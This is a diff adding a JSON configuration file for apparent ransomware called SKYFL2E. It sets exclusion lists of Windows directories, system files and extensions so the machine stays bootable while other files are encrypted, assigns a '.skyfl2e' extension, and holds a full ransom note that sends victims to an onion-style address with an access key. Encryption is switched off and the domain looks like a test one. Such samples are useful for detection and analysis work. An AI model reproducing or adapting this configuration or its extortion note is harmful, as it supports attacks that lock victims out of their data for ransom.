@@ -1,0 +1,10 @@
+{
+    "exclude_directory_names": ["system volume information","intel","$windows.~ws","application data","$recycle.bin", "mozilla","program files (x86)","program files","$windows.~bt","public","msocache","windows","default","all users", "tor browser", "programdata","boot","config.msi","google","perflogs","appdata","windows.old","WindowsAzure"],
+    "exclude_file_names": ["desktop.ini","autorun.inf","ntldr","bootsect.bak","thumbs.db","boot.ini","ntuser.dat", "iconcache.db","bootfont.bin","ntuser.ini","ntuser.dat.log"],
+    "exclude_file_extensions": ["themepack","nls","diagpkg", "msi","lnk","exe","cab","scr","bat","drv","rtp","msp","prf","msc", "ico", "key","ocx","diagcab","diagcfg", "pdb","wpx","hlp","icns","rom","dll","msstyles","mod","ps1","ics","hta","bin","cmd","ani", "386","lock","cur","idx","sys","com","deskthemepack","shs","ldf","theme","mpa","nomedia", "spl","cpl","adv","icl","msu","xtlog"],
+    "strict_include_paths": [],
+    "enable_enc": false,
+    "extension": ".skyfl2e",
+    "note_file_name": "RECOVER-SKYFL2E-FILES.txt",
+    "note_full_text": ">>Introduction\nImportant files on your machine were ENCRYPTED and now they have the \"SKYFL2E\" extension.\nIn order to recover your files, you need to follow the instructions below.\n\n>>CAUTION\nDO NOT MODIFY ENCRYPTED FILES YOURSELF.\nDO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.\nYOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.\nYOUR DATA IS STRONGLY ENCRYPTED, YOU CANNOT DECRYPT IT WITHOUT CIPHER KEY.\n\n>>What Should I do Next?\nFollow these simple steps to get everything back to normal:\n1) Download and install Tor browser from https://www.torproject.org/download/\n2) Navigate to: askfjejtqekjge0et1lkjasdq09gji13jgkdajv.testonion/?access-key=2646AEF615CD1126\n"
+}
